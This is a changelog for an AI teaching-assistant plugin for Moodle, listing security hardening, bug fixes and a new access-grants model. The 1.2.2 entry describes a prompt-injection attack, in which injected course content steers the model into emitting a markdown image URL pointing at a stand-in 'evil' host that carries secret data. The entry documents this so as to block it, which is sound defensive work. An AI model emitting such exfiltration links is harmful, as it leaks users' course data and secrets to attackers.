# Changelog

All notable changes to **AI Teacher Assistant** (`local_groundedai`). Dates are ISO (YYYY-MM-DD).

## 1.2.2 — 2026-10-17

Hardening pass from a cross-referenced external-threat review (OWASP Top 10 for LLM Applications 2025,
Moodle security guidelines, and the AI-in-Moodle plugin ecosystem), which confirmed 15 issue classes
were already handled and surfaced the items below. No database schema change beyond a new cache
definition.

### Security
- **Block the markdown-image exfiltration channel.** Remote images in assistant output are now stripped
  (`conversation::render_assistant_html`). Moodle's HTML cleaner keeps `<img src=https…>` by design, so a
  model steered by injected forum/file/course content could have used `![](https://evil/?d=secret)` as a
  zero-click, render-time data-exfiltration path (the OWASP LLM05 / "EchoLeak" class). Links are
  unaffected; a regression test asserts no remote `<img>`, script, or `javascript:` survives.
- **Require https for the provider and telemetry endpoints** (http is allowed only for a localhost
  endpoint, so self-hosted models still work), so the API key and course data are never sent in
  cleartext.
- **Per-user hourly question cap** (new "Questions per user per hour" setting, default 60, 0 = unlimited)
  as a denial-of-wallet guard on a metered provider key, mirroring Moodle core AI's own rate limits.

### Hardening
- The staff UI shows a brief "AI-generated — verify" notice.
- A failed provider call shows staff a generic message; the provider's own detail is logged for admins
  (and still shown on the Test-connection page).
- Source links (if ever populated) are restricted to http(s) schemes; the retention setting now spells
  out that the default keeps conversations forever.

## 1.2.1 — 2026-10-17

Pre-release hardening pass. No database schema change; upgrading is a version bump only.

### Security
- The grade, quiz, assignment, forum-activity, grading-queue and action-link tools now pass through the
  shared read gate, so they enforce `can_access_course()` **and** the grant's course scope. Previously a
  course-scoped grant was ignored by these tools, and a capability inherited from a category role could
  surface grades for a course the caller could not otherwise open.
- Scoped the post-reply message re-read in `conversation::send()` to the current conversation, closing a
  window where a concurrent send could return another conversation's (another user's) messages.

### Fixed
- The grant-change audit trail was always empty: the `grant_changed` event carried an object id without
  an object table, so every trigger threw and was swallowed. The event now records correctly.
- File upload was rejected for everyone — the upload web services still checked a global setting that
  this version removes. They now check the per-grant "upload" feature.
- A date-based grant expiry was off by one day (a same-day expiry was inactive the moment it was saved);
  the expiry date is now stored as the end of the chosen day.

### Performance
- Removed an N+1 in group member counts (`get_student_groups`) — one grouped query instead of one per
  group — and in forum author-name resolution (`get_forum_posts`) — one query across all discussions.

### Docs & housekeeping
- README rewritten for the grants/governance model and the consolidated settings pages.
- Completed the privacy metadata (grants `usermodified`); removed orphaned language strings and a
  broken dev-only CLI script left over from the previous access model; added this changelog and a
  developer guide.

## 1.2.0 — 2026-10-16

- Replaced the global allow/deny access model with an **access-grants** model (AWS-security-group style):
  one grant per role or per person, each with a course scope (all / enrolled / specific courses), an
  optional expiry, and its own data domains and sensitive features. Access is a strict allowlist; there
  is no block list. Student, guest and learner roles are structurally non-grantable.
- Added the **Governance & compliance** console: the grants table, a date-filtered access log with CSV
  export, and a downloadable compliance evidence pack.
- Consolidated every setting under one "AI Teacher Assistant" admin category (Setup + Governance).
- Added a provider connection test.
